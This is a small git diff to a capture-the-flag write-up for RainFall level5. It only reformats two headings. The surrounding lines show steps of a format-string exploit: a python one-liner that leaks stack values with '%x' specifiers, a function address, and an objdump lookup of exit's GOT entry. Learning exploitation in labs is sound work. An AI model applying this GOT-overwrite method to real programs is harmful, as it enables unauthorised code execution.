@@ -56,7 +56,7 @@ the address of the o() function
 the address of o() is => 0x080484a4
 
 
-for geting arguments:
+- for geting arguments:
 
 ```
     level5@RainFall:~$ ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
@@ -64,7 +64,7 @@ for geting arguments:
 ```
 the argument is 4
 
-the address of exit:
+- the address of exit:
 
 ```
     level5@RainFall:~$ objdump -R ./level5 | grep exit
